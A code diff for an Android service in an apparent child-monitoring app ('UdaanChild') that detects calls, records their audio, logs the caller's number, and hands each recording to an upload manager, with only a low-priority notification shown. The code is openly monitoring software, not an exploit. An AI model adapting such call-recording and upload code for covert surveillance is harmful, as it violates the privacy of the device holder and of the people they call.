@@ -8,194 +8,162 @@ import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.media.MediaRecorder
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
 import android.os.PowerManager
 import android.telephony.PhoneStateListener
-import android.telephony.TelephonyCallback
 import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.cancel
-import kotlinx.coroutines.launch
 import java.io.File
 
 class CallRecorderService : Service() {
 
-    private var telephonyManager: TelephonyManager? = null
-    private var legacyListener: PhoneStateListener? = null
-    private var modernCallback: TelephonyCallback? = null
+    companion object {
+        private const val TAG = "CallRecorderService"
+        private const val CHANNEL_ID = "udaan_recorder_channel"
+        private const val NOTIFICATION_ID = 101
+    }
 
+    private var telephonyManager: TelephonyManager? = null
+    private var phoneListener: PhoneStateListener? = null
     private var mediaRecorder: MediaRecorder? = null
     private var isRecording = false
-    private var currentCallType = "UNKNOWN"
+    private var lastPhoneNumber = ""
+    private var lastCallType = "UNKNOWN"
     private var callStartTime = 0L
-    private var lastRecordedPhone = "unknown"
     private var wakeLock: PowerManager.WakeLock? = null
-
-    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-
-    companion object {
-        const val CHANNEL_ID = "udaan_child_recorder"
-        private const val NOTIFICATION_ID = 101
-        private const val TAG = "CallRecorderService"
-    }
 
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        registerPhoneStateListener()
         acquireWakeLock()
+        registerPhoneListener()
+        // Resume queue processing on start
+        UploadManager.processQueue(applicationContext)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Call Recorder Active")
-            .setContentText("Monitoring voice activity")
+            .setContentTitle("UdaanChild Active")
+            .setContentText("Call monitoring running")
             .setSmallIcon(android.R.drawable.ic_btn_speak_now)
             .setOngoing(true)
             .build()
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(
-                NOTIFICATION_ID,
-                notification,
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-            )
-        } else {
-            startForeground(NOTIFICATION_ID, notification)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
+            } else {
+                startForeground(NOTIFICATION_ID, notification)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "startForeground failed", e)
         }
-
         return START_STICKY
     }
 
-    private fun registerPhoneStateListener() {
-        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+    @Suppress("DEPRECATION")
+    private fun registerPhoneListener() {
+        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            // Android 12+ API
-            modernCallback = object : TelephonyCallback(), TelephonyCallback.CallStateListener {
-                override fun onCallStateChanged(state: Int) {
-                    handleCallState(state, null)
+        phoneListener = object : PhoneStateListener() {
+            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
+                when (state) {
+                    TelephonyManager.CALL_STATE_RINGING -> {
+                        lastPhoneNumber = phoneNumber ?: "unknown"
+                        lastCallType = "INCOMING"
+                    }
+                    TelephonyManager.CALL_STATE_OFFHOOK -> {
+                        val number = phoneNumber ?: lastPhoneNumber.ifEmpty { "unknown" }
+                        lastPhoneNumber = number
+                        if (!isRecording) {
+                            if (lastCallType != "INCOMING") {
+                                lastCallType = "OUTGOING"
+                            }
+                            startRecording(number)
+                        }
+                    }
+                    TelephonyManager.CALL_STATE_IDLE -> {
+                        if (isRecording) {
+                            stopRecording()
+                        }
+                        lastCallType = "UNKNOWN"
+                    }
                 }
-            }
-            modernCallback?.let {
-                telephonyManager?.registerTelephonyCallback(mainExecutor, it)
-            }
-        } else {
-            // Android 11 aur neeche
-            @Suppress("DEPRECATION")
-            legacyListener = object : PhoneStateListener() {
-                @Deprecated("Deprecated in Java")
-                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
-                    handleCallState(state, phoneNumber)
-                }
-            }
-            @Suppress("DEPRECATION")
-            telephonyManager?.registerListener(legacyListener, PhoneStateListener.LISTEN_CALL_STATE)
-        }
-    }
-
-    private fun handleCallState(state: Int, phoneNumber: String?) {
-        when (state) {
-            TelephonyManager.CALL_STATE_RINGING -> {
-                currentCallType = "INCOMING"
-                if (!phoneNumber.isNullOrBlank()) {
-                    lastRecordedPhone = phoneNumber
-                }
-            }
-            TelephonyManager.CALL_STATE_OFFHOOK -> {
-                if (currentCallType != "INCOMING") {
-                    currentCallType = "OUTGOING"
-                }
-                callStartTime = System.currentTimeMillis()
-                startRecording(if (!phoneNumber.isNullOrBlank()) phoneNumber else lastRecordedPhone)
-            }
-            TelephonyManager.CALL_STATE_IDLE -> {
-                if (isRecording) {
-                    stopRecording()
-                }
-                currentCallType = "UNKNOWN"
             }
         }
+
+        @Suppress("DEPRECATION")
+        phoneListener?.let {
+            telephonyManager?.listen(it, PhoneStateListener.LISTEN_CALL_STATE)
+        }
+        Log.d(TAG, "Phone listener registered")
     }
 
     private fun startRecording(phone: String) {
-        if (isRecording) return
-        lastRecordedPhone = phone
-
         try {
+            callStartTime = System.currentTimeMillis() // Pehle set karein taaki filename aur duration theek rahe
             val dir = File(filesDir, "recordings")
             if (!dir.exists()) dir.mkdirs()
+            val file = File(dir, "call_${phone}_${callStartTime}.mp4")
 
-            val file = File(dir, "call_${phone}_${System.currentTimeMillis()}.m4a")
-
-            mediaRecorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                MediaRecorder(this)
+            @Suppress("DEPRECATION")
+            val recorder: MediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                MediaRecorder(applicationContext)
             } else {
-                @Suppress("DEPRECATION")
                 MediaRecorder()
-            }).apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC) // VOICE_COMMUNICATION ya MIC
+            }
+
+            recorder.apply {
+                setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setAudioSamplingRate(44100)
-                setAudioEncodingBitRate(64000)
+                setAudioSamplingRate(16000)
+                setAudioEncodingBitRate(32000)
                 setOutputFile(file.absolutePath)
                 prepare()
                 start()
             }
+
+            mediaRecorder = recorder
             isRecording = true
-            Log.d(TAG, "Recording started for: $phone")
+            Log.d(TAG, "Recording started: ${file.absolutePath}")
         } catch (e: Exception) {
-            Log.e(TAG, "startRecording failed", e)
-            mediaRecorder?.reset()
-            mediaRecorder = null
+            Log.e(TAG, "startRecording error", e)
             isRecording = false
         }
     }
 
     private fun stopRecording() {
-        if (!isRecording) return
         try {
-            mediaRecorder?.apply {
-                stop()
-                release()
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "stop failed", e)
-        } finally {
+            val recorder = mediaRecorder ?: return
+            val duration = (System.currentTimeMillis() - callStartTime) / 1000
+
+            recorder.stop()
+            recorder.release()
             mediaRecorder = null
             isRecording = false
-        }
 
-        val duration = (System.currentTimeMillis() - callStartTime) / 1000
-        Log.d(TAG, "Recording stopped. Duration: ${duration}s")
+            val dir = File(filesDir, "recordings")
+            val latest = dir.listFiles()?.maxByOrNull { it.lastModified() }
+            val phone = lastPhoneNumber
 
-        val dir = File(filesDir, "recordings")
-        val latest = dir.listFiles()?.maxByOrNull { it.lastModified() }
-
-        if (latest != null) {
-            serviceScope.launch {
-                val success = UploadManager.uploadRecording(
+            if (latest != null) {
+                Log.d(TAG, "Recording stopped: ${latest.name}, dur=${duration}s")
+                UploadManager.uploadRecording(
+                    context = applicationContext,
                     file = latest,
-                    deviceId = "practice_device",
-                    phoneNumber = lastRecordedPhone,
-                    callType = currentCallType,
+                    phoneNumber = phone,
+                    callType = lastCallType,
                     duration = duration,
                     timestamp = callStartTime
                 )
-                if (!success) {
-                    DatabaseHelper.addToQueue(
-                        type = "recording",
-                        filePath = latest.absolutePath,
-                        jsonData = "{\"phone\":\"$lastRecordedPhone\",\"type\":\"$currentCallType\",\"duration\":$duration}",
-                        timestamp = callStartTime
-                    )
-                }
+            } else {
+                Log.e(TAG, "stopRecording: no file found")
             }
+        } catch (e: Exception) {
+            Log.e(TAG, "stopRecording error", e)
+            isRecording = false
         }
     }
 
@@ -203,15 +171,16 @@ class CallRecorderService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Call Recorder Service",
+                "Call Recorder",
                 NotificationManager.IMPORTANCE_LOW
             )
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
         }
     }
 
+    @Suppress("DEPRECATION")
     private fun acquireWakeLock() {
-        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "udaan:recorder").apply {
             acquire(10 * 60 * 1000L) // 10 min safe timeout
         }
@@ -219,31 +188,24 @@ class CallRecorderService : Service() {
 
     private fun releaseWakeLock() {
         try {
-            if (wakeLock?.isHeld == true) {
-                wakeLock?.release()
-            }
+            if (wakeLock?.isHeld == true) wakeLock?.release()
         } catch (_: Exception) {}
     }
 
-    private fun unregisterPhoneStateListener() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            modernCallback?.let { telephonyManager?.unregisterTelephonyCallback(it) }
-            modernCallback = null
-        } else {
-            @Suppress("DEPRECATION")
-            legacyListener?.let { telephonyManager?.listen(it, PhoneStateListener.LISTEN_NONE) }
-            legacyListener = null
-        }
-    }
-
+    @Suppress("DEPRECATION")
     override fun onDestroy() {
-        unregisterPhoneStateListener()
-        if (isRecording) stopRecording()
+        Log.d(TAG, "onDestroy")
+        if (isRecording) {
+            try { mediaRecorder?.stop(); mediaRecorder?.release() } catch (_: Exception) {}
+            isRecording = false
+        }
+        phoneListener?.let {
+            telephonyManager?.listen(it, PhoneStateListener.LISTEN_NONE)
+        }
+        phoneListener = null
         releaseWakeLock()
-        serviceScope.cancel()
         super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 }
-
